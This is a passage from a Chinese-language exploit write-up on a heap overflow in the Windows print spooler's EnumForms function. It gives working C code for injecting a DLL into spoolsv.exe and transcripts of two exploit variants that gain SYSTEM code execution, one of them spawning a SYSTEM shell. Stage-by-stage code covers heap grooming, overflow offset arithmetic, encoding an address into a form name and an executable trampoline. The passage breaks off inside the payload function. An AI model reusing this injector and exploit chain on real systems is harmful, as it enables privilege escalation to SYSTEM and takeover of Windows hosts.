                if ((int)remain <= 0) { CancelIo(hPipe); break; }
                if (WaitForSingleObject(hEvent, remain) != WAIT_OBJECT_0) { CancelIo(hPipe); break; }
                if (!GetOverlappedResult(hPipe, &ov, &got, FALSE)) break;
            } else {
                break;
            }
        }

        if (got == 0) break;

        fwrite(buf, 1, got, stdout);
        fflush(stdout);

        if (GetTickCount() - start > overallMs) break;
    }

    printf("---- end payload ----\n");

    CloseHandle(hEvent);
    return TRUE;
}

int wmain(int argc, wchar_t *argv[]) {
    wchar_t dllPath[MAX_PATH];
    DWORD pid;
    HANDLE hProcess, hThread, hPipe;
    LPVOID remoteMem;
    SIZE_T written;
    DWORD exitCode;

    printf("============================================================\n");
    printf("  spoolsv.exe DLL Injector for YEnumForms Test\n");
    printf("============================================================\n\n");

    if (argc > 1) {
        wchar_t rawPath[MAX_PATH];
        wcscpy_s(rawPath, MAX_PATH, argv[1]);
        if (!GetFullPathNameW(rawPath, MAX_PATH, dllPath, NULL)) {
            wcscpy_s(dllPath, MAX_PATH, rawPath);
        }
    } else {
        GetModuleFileNameW(NULL, dllPath, MAX_PATH);
        wchar_t *lastSlash = wcsrchr(dllPath, L'\\');
        if (lastSlash) *(lastSlash + 1) = 0;
        wcscat_s(dllPath, MAX_PATH, L"payload_enumforms.dll");
    }

    printf("[*] DLL: %S\n", dllPath);

    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %S\n", dllPath);
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        printf("[!] Warning: Could not enable SeDebugPrivilege\n");
    } else {
        printf("[+] SeDebugPrivilege enabled\n");
    }

    hPipe = CreateNamedPipeW(PIPE_NAME,
                             PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
                             PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                             1, 0, 65536, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %u\n", GetLastError());
        return 1;
    }
    printf("[+] Relay pipe ready: %S\n", PIPE_NAME);

    pid = FindProcessByName(L"spoolsv.exe");
    if (!pid) {
        printf("[-] spoolsv.exe not found\n");
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] spoolsv.exe PID: %u\n", pid);

    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %u\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Process opened\n");

    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    remoteMem = VirtualAllocEx(hProcess, NULL, pathSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %u\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hPipe);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, &written)) {
        printf("[-] WriteProcessMemory failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] DLL path written to spoolsv @ 0x%p\n", remoteMem);

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!loadLibAddr) {
        printf("[-] Cannot find LoadLibraryW\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hPipe);
        return 1;
    }

    printf("[*] Injecting DLL into spoolsv.exe...\n");
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)loadLibAddr,
                                 remoteMem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hPipe);
        return 1;
    }

    WaitForSingleObject(hThread, 10000);
    GetExitCodeThread(hThread, &exitCode);

    if (exitCode == 0) {
        printf("[-] LoadLibrary returned NULL -- DLL load failed\n");
        printf("    Check if the DLL exists and is 64-bit\n");
    } else {
        printf("[+] DLL loaded at 0x%08X in spoolsv\n", exitCode);
    }

    printf("[*] Waiting for the payload to stream its staged output...\n");
    if (!RelayPayloadOutput(hPipe, 5000, 30000)) {
        printf("[*] This payload did not stream live;\n");
        printf("    see C:\\Windows\\Temp\\enumforms_inject_log.txt for its staged log.\n");
    }

    DWORD spoolPid = FindProcessByName(L"spoolsv.exe");
    if (spoolPid == pid) {
        printf("[+] spoolsv.exe still running (PID %u)\n", spoolPid);
    } else if (spoolPid) {
        printf("[!] spoolsv.exe restarted (new PID %u, was %u)\n", spoolPid, pid);
        printf("    *** CRASH DETECTED -- vulnerability confirmed! ***\n");
    } else {
        printf("[!] spoolsv.exe is DEAD!\n");
        printf("    *** CRASH DETECTED -- vulnerability confirmed! ***\n");
    }

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    printf("\n[*] SYSTEM token proof also written to C:\\Windows\\Temp\\EXPLOITED.txt\n");
    return 0;
}
```

在 Windows 11 Canary 版上用两个 exploit 变体复现利用的完整步骤如下。但先强调一个小限制：现代 Windows 版本上，即便以 Administrator 登录，我们手里也没有带 SeDebugPrivilege 的 High-IL 管理员 token，只有一个不带 SeDebugPrivilege 的中等 token。无论该权限处于启用还是禁用状态，关键是它必须 **在场**——只要在，注入器就能启用它，一切照常运转。

首先是 exploit 变体 A 的流程：

```sql
C:\Users\Administrator\ers11> ver
Microsoft Windows [Version 10.0.29683.1000]

C:\Users\Administrator\ers11> powershell -c "Stop-Service Spooler -Force; taskkill /F /IM WerFault.exe 2>$null; taskkill /F /IM spoolsv.exe 2>$null; Start-Sleep 2; Start-Service Spooler"

C:\Users\Administrator\ers11> powershell -c "Get-Service Spooler"

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler

C:\Users\Administrator\ers11> powershell -c "(Get-Item C:\Windows\System32\spoolss.dll).VersionInfo.FileVersion"
10.0.29683.1000 (WinBuild.160101.0800)

C:\Users\Administrator\ers11> powershell -c "Get-FileHash C:\Windows\System32\spoolsv.exe -Algorithm SHA256"

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          9BD943AAF6925609DE67127D3ECFF02996816B8AEF0004F22925AA78CA47C1A5       C:\Windows\System32\spoolsv.exe

C:\Users\Administrator\ers11> call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

C:\Users\Administrator\ers11> cl /W4 /O2 /LD /D_CRT_SECURE_NO_WARNINGS exploit_stage4_exec_clean.c /Fe:payload_token.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.34.31937 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

exploit_stage4_exec_clean.c
Microsoft (R) Incremental Linker Version 14.34.31937.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/dll
/implib:payload_token.lib
/out:payload_token.dll
exploit_stage4_exec_clean.obj

C:\Users\Administrator\ers11> powershell -c "Get-Process spoolsv"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    434      21     3896      17988       0.20   14316   0 spoolsv

C:\Users\Administrator\ers11> inject_enumforms.exe payload_token.dll

============================================================
  spoolsv.exe DLL Injector for YEnumForms Test
============================================================

[*] DLL: C:\Users\Administrator\ers11\payload_token.dll
[+] SeDebugPrivilege enabled
[+] spoolsv.exe PID: 14316
[+] Process opened
[+] DLL path written to spoolsv @ 0x0000000000810000
[*] Injecting DLL into spoolsv.exe...
[+] Remote thread created. Waiting for DLL to execute...
[+] Thread completed. Exit code: 0x6E7A0000
[+] DLL loaded at 0x6E7A0000 in spoolsv
[+] spoolsv.exe still running (PID 14316)

[*] Check C:\Windows\Temp\enumforms_inject_log.txt for results

C:\Users\Administrator\ers11> powershell -c "Get-Process spoolsv"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    541      26     6000      26068       0.41   14316   0 spoolsv

C:\Users\Administrator\ers11> cat C:\Windows\Temp\enumforms_inject_log.txt

============================================================
  EXPLOIT STAGE 4: Code Execution via Heap Overflow
  PID: 14316 (spoolsv.exe, NT AUTHORITY\SYSTEM)
============================================================

============================================================
  STEP 0: BUILD TRAMPOLINE AND ENCODE TARGET ADDRESS
============================================================

[*] Step 0: Preparing shellcode function
    shellcode_func at: 0x00007FF86E7A1D00
    Address bytes: 00 1D 7A 6E F8 7F 00 00
    [+] Address is null-free; encoding it directly (no trampoline)
    Form name encoding: L"\x1D00\x6E7A\x7FF8" + null
    Decoded address: 0x00007FF86E7A1D00 (MATCH!)
[+] Step 0 complete: callback value ready

============================================================
  STEP 1: RESOLVE ROUTER EXPORTS AND OPEN PRINTER
============================================================

[*] spoolss.dll at 0x00007FF869A00000
    [+] OpenPrinterW/EnumFormsW/ClosePrinter/AddFormW/DeleteFormW resolved
    [+] Printer handle: 0x000000000062C920
[+] Step 1 complete: router ready, local print server opened

============================================================
  STEP 2: PLANT FORM WHOSE NAME ENCODES THE ADDRESS
============================================================

[*] Step 2: Adding form with encoded address name
    [+] Form added
[+] Step 2 complete: attacker bytes are now in the form store

============================================================
  STEP 3: MEASURE LAYOUT (needed, custom_off)
============================================================

[*] Step 3: needed=12090, forms=0
    Custom form at index 174, string at buf+0x1B58
[+] Step 3 complete: our name packs at buf+0x1B58 in an honest buffer

============================================================
  STEP 4: SPRAY CALLBACK OBJECTS AND OPEN HOLES
============================================================

[*] Step 4: Spraying callback objects (size=0x2F3A)
    [+] Sprayed 300 SPRAY_OBJ blocks (marker 0xCAFEBABE)
    [+] Freed every 4-th block to open holes
[+] Step 4 complete: heap groomed

============================================================
  STEP 5: PLACE VICTIM BUFFER AND FIND THE NEIGHBOR
============================================================

    buffer at 0000000002399070
    target spray[287] at 000000000239C080 (delta=0x3010)
[+] Step 5 complete: victim dropped next to spray[287]

============================================================
  STEP 6: PRECISION OVERFLOW (cbBuf = needed + shift)
============================================================

[*] Step 6: Precision overflow
    custom_off=0x1B58, delta=0x3010, shift=0x14B8, cbBuf=0x43F2
    Overflow triggered: ret=175
[+] Step 6 complete: packed name deposited at the neighbor

============================================================
  STEP 7: VERIFY THE CORRUPTION AND EXECUTE
============================================================

[*] Step 7: Checking target corruption
    target->callback = 0x00007FF86E7A1D00
    shellcode_addr   = 0x00007FF86E7A1D00
    target->marker   = 0x0061004A (was 0xCAFEBABE)

    [!!!] CALLBACK POINTER MATCHES SHELLCODE ADDRESS!
    [!!!] Calling through corrupted pointer...

    [!!!] SHELLCODE EXECUTED SUCCESSFULLY!
    [!!!] Check C:\Windows\Temp\EXPLOITED.txt for proof.
[+] Step 7 complete

============================================================
  EXPLOIT COMPLETE. spoolsv.exe PID=14316 still running.
============================================================
```

接着是 exploit 变体 B 的流程：

```
C:\Users\Administrator\ers11> powershell -c "Stop-Service Spooler -Force; taskkill /F /IM WerFault.exe 2>$null; taskkill /F /IM spoolsv.exe 2>$null; Start-Sleep 2; Start-Service Spooler"

C:\Users\Administrator\ers11> powershell -c "Get-Process spoolsv"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    171      14     2020       9664       0.03    6600   0 spoolsv

C:\Users\Administrator\ers11> call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

C:\Users\Administrator\ers11> cl /W4 /O2 /LD /D_CRT_SECURE_NO_WARNINGS exploit_stage4_shell_clean.c /Fe:payload_shell.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.34.31937 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

exploit_stage4_shell_clean.c
Microsoft (R) Incremental Linker Version 14.34.31937.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/dll
/implib:payload_shell.lib
/out:payload_shell.dll
exploit_stage4_shell_clean.obj

C:\Users\Administrator\ers11> inject_enumforms.exe payload_shell.dll

============================================================
  spoolsv.exe DLL Injector for YEnumForms Test
============================================================

[*] DLL: C:\Users\Administrator\ers11\payload_shell.dll
[+] SeDebugPrivilege enabled
[+] Relay pipe ready: \\.\pipe\ers11_enumforms
[+] spoolsv.exe PID: 12916
[+] Process opened
[+] DLL path written to spoolsv @ 0x0000000001130000
[*] Injecting DLL into spoolsv.exe...
[+] DLL loaded at 0x69A20000 in spoolsv

[*] Waiting for the payload to stream its staged output...

---- begin payload (spoolsv.exe, Session 0, NT AUTHORITY\SYSTEM) ----

============================================================
  EXPLOIT STAGE 4: Code Execution via Heap Overflow
  PID: 12916 (spoolsv.exe, NT AUTHORITY\SYSTEM)
============================================================

============================================================
  STEP 0: BUILD TRAMPOLINE AND ENCODE TARGET ADDRESS
============================================================

[*] Step 0: Preparing shellcode function
    shellcode_func at: 0x00007FF869A21E70
    Address bytes: 70 1E A2 69 F8 7F 00 00
    [+] Address is null-free; encoding it directly (no trampoline)
    Form name encoding: L"\x1E70\x69A2\x7FF8" + null
    Decoded address: 0x00007FF869A21E70 (MATCH!)
[+] Step 0 complete: callback value ready

============================================================
  STEP 1: RESOLVE ROUTER EXPORTS AND OPEN PRINTER
============================================================

[*] spoolss.dll at 0x00007FF865F60000
    [+] OpenPrinterW/EnumFormsW/ClosePrinter/AddFormW/DeleteFormW resolved
    [+] Printer handle: 0x000000000156C920
[+] Step 1 complete: router ready, local print server opened

============================================================
  STEP 2: PLANT FORM WHOSE NAME ENCODES THE ADDRESS
============================================================

[*] Step 2: Adding form with encoded address name
    [+] Form added
[+] Step 2 complete: attacker bytes are now in the form store

============================================================
  STEP 3: MEASURE LAYOUT (needed, custom_off)
============================================================

[*] Step 3: needed=12090, forms=0
    Custom form at index 174, string at buf+0x1B58
[+] Step 3 complete: our name packs at buf+0x1B58 in an honest buffer

============================================================
  STEP 4: SPRAY CALLBACK OBJECTS AND OPEN HOLES
============================================================

[*] Step 4: Spraying callback objects (size=0x2F3A)
    [+] Sprayed 300 SPRAY_OBJ blocks (marker 0xCAFEBABE)
    [+] Freed every 4-th block to open holes
[+] Step 4 complete: heap groomed

============================================================
  STEP 5: PLACE VICTIM BUFFER AND FIND THE NEIGHBOR
============================================================

    buffer at 00000000027BA7E0
    target spray[283] at 00000000027BD7F0 (delta=0x3010)
[+] Step 5 complete: victim dropped next to spray[283]

============================================================
  STEP 6: PRECISION OVERFLOW (cbBuf = needed + shift)
============================================================

[*] Step 6: Precision overflow
    custom_off=0x1B58, delta=0x3010, shift=0x14B8, cbBuf=0x43F2
    Overflow triggered: ret=175
[+] Step 6 complete: packed name deposited at the neighbor

============================================================
  STEP 7: VERIFY THE CORRUPTION AND EXECUTE
============================================================

[*] Step 7: Checking target corruption
    target->callback = 0x00007FF869A21E70
    shellcode_addr   = 0x00007FF869A21E70
    target->marker   = 0x0061004A (was 0xCAFEBABE)

    [!!!] CALLBACK POINTER MATCHES SHELLCODE ADDRESS!
    [!!!] Calling through corrupted pointer...

============================================================
  EXPLOIT PROOF: Code Execution as SYSTEM
  spoolsv.exe EnumForms Heap Overflow (CWE-122 / CWE-787)
============================================================

Process: spoolsv.exe (PID 12916)
Token User: NT AUTHORITY\SYSTEM
Token SID:  S-1-5-18
Token Privileges: 5
  SeAssignPrimaryTokenPrivilege [Disabled]
  SeTcbPrivilege [Enabled]
  SeAuditPrivilege [Enabled]
  SeChangeNotifyPrivilege [Enabled]
  SeImpersonatePrivilege [Enabled]
Integrity Level: SYSTEM (0x4000)

[*] Spawning SYSTEM shell in user session...
[*] Target session: 2
[+] SYSTEM shell created! PID: 11608
[+] Shell token SID: S-1-5-18

    [!!!] SHELLCODE EXECUTED SUCCESSFULLY!
    [!!!] Check C:\Windows\Temp\EXPLOITED.txt for proof.
[+] Step 7 complete

============================================================
  EXPLOIT COMPLETE. spoolsv.exe PID=12916 still running.
============================================================

---- end payload ----

[+] spoolsv.exe still running (PID 12916)

[*] SYSTEM token proof also written to C:\Windows\Temp\EXPLOITED.txt

C:\Users\Administrator\ers11>
```

你会看到目标系统上弹出一个以 SYSTEM 身份运行的终端。Game over。

## 10\. 利用过程技术要点

最需要强调的事实：DLL 注入需要管理员权限，而且 SeDebugPrivilege 必须在场——无论启用还是禁用。正如前几节所说，为寻找经由该漏洞远程攻陷目标系统的路径，我只试过一次、仅仅一次。读者应当去仔细排查可能的路径，确认这个漏洞真的无法用于远程利用——因为微软终究不会修它，将来可能酿成更大的问题。

两个 exploit 遵循的序列都是“溢出 → 四个阶段 → SYSTEM”，四个阶段即 groom（布局）、corrupt（破坏）、control（控制）、execution（执行）。和往常一样，清理工作要格外用心：两个 exploit 都通过 DeleteFormW 函数删除自己植入的表单、释放全部分配，不留任何用户表单。

注入器本身没什么新意，或许唯一值得一提的坑是：我曾用 SE_DEBUG_NAME 而非 ANSI 字面量 “SeDebugPrivilege” 来写代码，结果传给 LookupPrivilegeValueW 函数时失败，权限从来没被启用过。

第二个 exploit 里，得选择把可见的 shell 投放到哪个会话。spoolsv.exe 跑在 Session 0，那里没有桌面；WTSGetActiveConsoleSessionId 函数返回的是物理控制台——管理员在 RDP 或 Hyper-V 增强会话里时它是空的，shell 投过去等于隐身。所以别走那条路，更可靠的做法是枚举会话、挑第一个处于 WTSActive 状态的，找不到活动会话再回退到控制台。

groom 是第一阶段，不过在运行顺序里显示为 Step 4——因为运行时它必须发生在尺寸协商之后。我们 spray 的对象决定了最终目标：

```cpp
typedef void (*PFN_CALLBACK)(void);

typedef struct _SPRAY_OBJ
{
    PFN_CALLBACK callback;   // the field we will overwrite
    DWORD        marker;     // 0xCAFEBABE
    DWORD        index;      // which spray slot this is
    BYTE         padding[1];
} SPRAY_OBJ;

#define SPRAY_COUNT    300
#define HOLE_INTERVAL  4
```

groom 本身由以下代码完成：

```rust
LOG("\n[*] Step 4: Spraying callback objects (size=0x%X)\n", needed);
g_heap = GetProcessHeap();

for (i = 0; i < SPRAY_COUNT; i++) {
    g_spray[i] = (SPRAY_OBJ *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);
    if (g_spray[i]) {
        g_spray[i]->callback = NULL;
        g_spray[i]->marker   = 0xCAFEBABE;
        g_spray[i]->index    = i;
    }
}
for (i = HOLE_INTERVAL; i < SPRAY_COUNT; i += HOLE_INTERVAL)   // make holes
    if (g_spray[i]) { HeapFree(g_heap, 0, g_spray[i]); g_spray[i] = NULL; }


BYTE *buffer = (BYTE *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);   // victim -> a hole

SPRAY_OBJ *target = NULL; LONGLONG min_d = 0x7FFFFFFF;
for (i = 0; i < SPRAY_COUNT; i++)
    if (g_spray[i]) {
        LONGLONG d = (LONGLONG)g_spray[i] - (LONGLONG)buffer;
        if (d > 0 && d < min_d) { min_d = d; target = g_spray[i]; }
    }
DWORD delta = (DWORD)min_d;   // observed is about 0x2790
```

细读这段代码：先分配 300 个 needed 字节的对象并打上 0xCAFEBABE 标记——之后更容易辨认哪些字节被“污染”了——然后每 4 块释放一块，打出洞。接着分配 victim 缓冲（即 EnumForms 的输出缓冲），它会落进某个洞。这一步的收尾是扫描：我们已经知道邻居是一个 SPRAY_OBJ，前 8 字节是函数指针（此刻为 NULL），偏移 0x8 处是 0xCAFEBABE。大致结构：

-   SPRAY_OBJ（大小 = needed）：偏移 0 处是 callback｜偏移 8 处是 marker（0xCAFEBABE）｜……
    
-   待覆写的正是那个 8 字节函数指针（callback）。
    

第二阶段先证明“够得着相邻对象”，再谈精度。做法是增大 cbBuf 参数，把打包字符串块推过 victim 的末端——任何被拷贝的表单名都会覆写相邻对象/结构体的 VS 头（\_HEAP_VS_CHUNK_HEADER）的前几个字节。此阶段的目标是证明可达，而不是控制落点和内容——那是第三、第四阶段的事。大致结构：

-   破坏 16 字节的 VS 头能证明够得着，但这么干不可取。
    

第三阶段经 AddFormW 函数注入受控内容，代码块如下：

```swift
LOG("\n[*] Step 2: Adding form with encoded address name\n");
{
    typedef struct { DWORD Flags; LPWSTR pName; SIZEL Size; RECTL ImageableArea; } MY_FORM_INFO_1;

    MY_FORM_INFO_1 fi = {0};
    fi.Flags = 0;
    fi.pName = g_form_name;
    fi.Size.cx = 215900; fi.Size.cy = 279400;  // 8.5x11in in 1000ths mm (a real Letter size)
    fi.ImageableArea.right = 215900; fi.ImageableArea.bottom = 279400;

    pDeleteForm(hPrinter, g_form_name);
    if (pAddForm(hPrinter, 1, (LPBYTE)&fi)) LOG("    [+] Form added\n");
    else LOG("    [ - ] AddForm: %u\n", GetLastError());
}
```

AddFormW 函数要求一个像样的 FORM_INFO_1，所以尺寸用了真实的 Letter 规格；但对我们来说关键字段是 pName——它的取值经过了精心挑选，因为稍后我们会逐条读取记录的 pName 字段来定位自己的表单，并据此算出我们的名字字符串在缓冲区内的偏移，代码如下：

```cpp
pEnum(hPrinter, 1, NULL, 0, &needed, &returned);
LOG("\n[*] Step 3: needed=%u, forms=%u\n", needed, returned);

DWORD custom_off = 0;
{
    BYTE *tmp = (BYTE *)HeapAlloc(GetProcessHeap(), 0, needed);
    if (tmp) {
        DWORD n = 0, r = 0;
        __try { pEnum(hPrinter, 1, tmp, needed, &n, &r); } __except(1) {}
        for (i = 0; i < (int)r; i++) {
            wchar_t *name = *(wchar_t **)(tmp + i*40 + 8);   // FORM_INFO_1[i].pName
            if (name && wcscmp(name, g_form_name) == 0) {
                custom_off = (DWORD)((BYTE *)name - tmp);    // our string's offset in buf
                LOG("    Custom form at index %d, string at buf+0x%X\n", i, custom_off);
                break;
            }
        }
        HeapFree(GetProcessHeap(), 0, tmp);
    }
}
if (custom_off == 0) { LOG("[-] Cannot find custom form string\n"); goto done; }
```

第四阶段负责精度，把内容放到分毫不差的位置。这一步最有意思的事实是：exploit 不覆写 VS 头，而是通过控制 cbBuf 参数算准落点、直接“跳”过头——cbBuf 相当于把数据向头之后推送的“shift”：

-   `custom_off + shift = delta`
-   `shift = delta - custom_off`
-   `cbBuf = needed + shift = needed + (delta - custom_off)`

这就是全部诀窍，在 exploit 里就是三行：

```
DWORD shift = delta - custom_off;
DWORD cbBuf = needed + shift;

__try {
    DWORD n = 0, r = 0;
    pEnum(hPrinter, 1, buffer, cbBuf, &n, &r);   // SEH-wrapped: must NOT crash
} __except(EXCEPTION_EXECUTE_HANDLER) { LOG("    EXCEPTION during overflow\n"); }
```

这样控制 cbBuf 参数，也就控制了 PackStrings 例程：它把我们命名的字符串精确放在目标（SPRAY_OBJ.callback）的第一个字段上。于是“写什么”“写到哪”都在掌握之中，还顺带保住了 VS header——动它必然当场弄死目标程序。

-   常规 `cbBuf = needed` ： `buffer[ .... name@custom_off .... ]` （留在缓冲区内｜无害）
    
-   攻击 `cbBuf = needed + shift` ， `shift = delta - custom_off` ： `buffer[ ....] [VS | spray_obj [ name@0x0 ... ]` ——覆写落在 target+0x0，正是 callback（函数指针）。
    
-   “name”落在 `buffer + custom_off + shift = buffer + delta = target+0x0` （callback）
    

target→callback 字段一旦被覆写，调用 `target->callback()` 就会把控制流送到我们指定的地方。但地址必须编码成表单名，这项工作由下面这段代码完成：

```cpp
static void encode_address_as_form_name(UINT_PTR addr, wchar_t *name, int max_len) {
    BYTE *bytes = (BYTE *)&addr; int i, wchar_count = 0;
    name[0] = 0;
    for (i = 0; i < 8; i += 2) {
        wchar_t wc = (wchar_t)(bytes[i] | (bytes[i+1] << 8));
        if (wc == 0) break;              // NUL word terminates (supplies high 0x0000)
        name[wchar_count++] = wc;
        if (wchar_count >= max_len - 1) break;
    }
    name[wchar_count] = 0;
}
```

举个例子，0x00007FFFF8BC1B90 会变换成 `L“\x1B90\xF8BC\x7FFF”` ，最重要的是末尾隐式的字符串终止符恰好补上最高的 0x0000。碰巧这个地址的低三个字里没有 NULL 字，于是直接编码、直接当 callback 用；可惜这不是普遍情况——往后会有一串地址，低位出现 NULL 字就会截断字符串、逼我们用 trampoline。因此 exploit 在继续之前会同时记录编码结果并把它解码回来核对，免得后面出问题。这项工作由下面这段代码完成：

```swift
encode_address_as_form_name(shellcode_addr, g_form_name, 128);

LOG("    Form name encoding: L\"");
for (i = 0; g_form_name[i]; i++) LOG("\\x%04X", g_form_name[i]);
LOG("\" + null\n");

UINT_PTR decoded = 0; BYTE *dec = (BYTE *)&decoded;
for (i = 0; g_form_name[i] && i < 4; i++) { dec[i*2] = g_form_name[i] & 0xFF; dec[i*2+1] = g_form_name[i] >> 8; }

LOG("    Decoded address: 0x%p %s\n", (void*)decoded, decoded == shellcode_addr ? "(MATCH!)" :
    (MISMATCH!)");
```

基于以上代码，把目标地址编码成表单名（直编或经 trampoline）可以归纳为：

-   address = 0x00007FFFF8BC1B90 → 小端表示： `90 1B BC F8 FF 7F 00 00`
    
-   按字分组：0x1B90 0xF8BC 0x7FFF 0x0000 → 宽字符串表示： `L“\x1B90\xF8BC\x7FFF”`
    
-   检查低三个字是否全非零：
    

-   分配一页不含 NULL 的可执行内存（记作 T），在其中放 trampoline，然后按 `48 B8 <&shellcode_function> FF E0` （mov rax…；jmp rax）的组合编码 T。
    

-   是 → 直接编码该地址：callback = &shellcode_func（本例）
    
-   否 → NULL 字会截断字符串，因此需要：
    

-   无论哪种情况，宽字符字符串都在第一个 NUL 字符处终止。
    

如前所述，真实函数地址的低位字节里往往嵌着 NULL 字，会把编码后的字符串截断。所以不该直接编码 &shellcode_func，而应分配一个不含 NULL 字节的可执行地址、在那里放 trampoline，由它跳转到真正的函数。下面这段代码体现了这一点：

```objectivec
UINT_PTR shellcode_addr = (UINT_PTR)&shellcode_func;
BYTE *addr_bytes = (BYTE *)&shellcode_addr;
BOOL has_null_wchar = FALSE;

for (i = 0; i < 6; i += 2) {                          // scan the low 3 words
    wchar_t wc = (wchar_t)(addr_bytes[i] | (addr_bytes[i+1] << 8));
    if (wc == 0) { has_null_wchar = TRUE; break; }
}
if (has_null_wchar) {
    for (UINT_PTR try_addr = 0x10010000; try_addr < 0x7FFF0000; try_addr += 0x10000) {
        BYTE *tb = (BYTE *)&try_addr;
        wchar_t w0 = tb[0] | (tb[1] << 8), w1 = tb[2] | (tb[3] << 8);
        if (w0 && w1) {                                // no NUL word in the low 4 bytes
            g_shellcode = VirtualAlloc((PVOID)try_addr, 4096, MEM_COMMIT|MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
            if (g_shellcode) {
                BYTE *code = (BYTE *)g_shellcode;
                code[0] = 0x48; code[1] = 0xB8;        // mov rax, imm64
                *(UINT_PTR *)(code + 2) = shellcode_addr;
                code[10] = 0xFF; code[11] = 0xE0;      // jmp rax
                shellcode_addr = (UINT_PTR)g_shellcode; // encode this null-free address
                break;
            }
        }
    }
}
```

现在 shellcode_addr 不含 NULL 字节、可以干净地编码，跳进去执行的就是“mov eax, &shellcode_func; jmp rax”。最后说明一下， `VirtualAlloc((PVOID)try_addr,...)` 调用会请求一个指定的基址——只要该地址空闲就能获批，这就是我们挑选带所需字节模式的基址的方法。

到这里，正确的表单名（编码着 trampoline 地址）已经就绪，接下来是验证并调用它：

```swift
__try {
    UINT_PTR written_ptr = (UINT_PTR)target->callback;
    LOG("    target->callback = 0x%p\n", (void *)written_ptr);
    LOG("    shellcode_addr   = 0x%p\n", (void *)shellcode_addr);
    LOG("    target->marker   = 0x%08X (was 0xCAFEBABE)\n", target->marker);

    if (written_ptr == shellcode_addr) {
        LOG("\n    [!!!] CALLBACK POINTER MATCHES SHELLCODE ADDRESS!\n");
        target->callback();                      // -> trampoline -> shellcode_func
        LOG("    [!!!] SHELLCODE EXECUTED SUCCESSFULLY!\n");
    }
} __except(EXCEPTION_EXECUTE_HANDLER) {
    LOG("    EXCEPTION 0x%08X during callback check\n", GetExceptionCode());
}
```

基于以上代码，target→callback 的值与 shellcode_addr 相同，一次间接调用即可跑起 trampoline、再跳进 shellcode_func。关键在于：这一切都发生在 spooler 的线程里，以 SYSTEM 身份运行。由于溢出写的是有效的堆内存，进程不会崩溃，spoolsv.exe 继续运行。如果不确定 callback 是否打得准，检查偏移 0x8 处的 marker 值——0xCAFEBABE 还在，就说明一切正常。

整个利用过程演示了越界写：写操作落在一个可 groom 的相邻 chunk 上，写的字节和目的地（一个 8 字节字段）都由我们控制。回看可知：EnumForms API 未授权调用方也能调用，但破坏 spoolsv 堆的写操作只存在于 spooler 进程内部，因此需要代码注入，而注入又要求 admin 以及随后的 SeDebugPrivilege。既然我们已经能把字节写上 spooler 持有的可调用指针、甚至 spooler 会跟随的数据指针，我们就能以 SYSTEM 身份执行操作。整个操作流程如下：

-   target→callback ｜ target→&shellcode_func → OpenProcessToken → NT AUTHORITY\\SYSTEM → 写 EXPLOIT.txt → CreateProcessW → cmd.exe → SYSTEM 执行
    

说到 shellcode_func 例程，代码如下：

```objectivec
static void __cdecl shellcode_func(void) {
    HANDLE hToken = NULL; char buf[4096]; int pos = 0; DWORD written; HANDLE hFile;

    pos += sprintf_s(buf+pos, sizeof(buf)-pos, "Process: spoolsv.exe (PID %u)\r\n",
                     GetCurrentProcessId());

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE tu[256]; DWORD rl = 0;
        if (GetTokenInformation(hToken, TokenUser, tu, sizeof(tu), &rl)) {
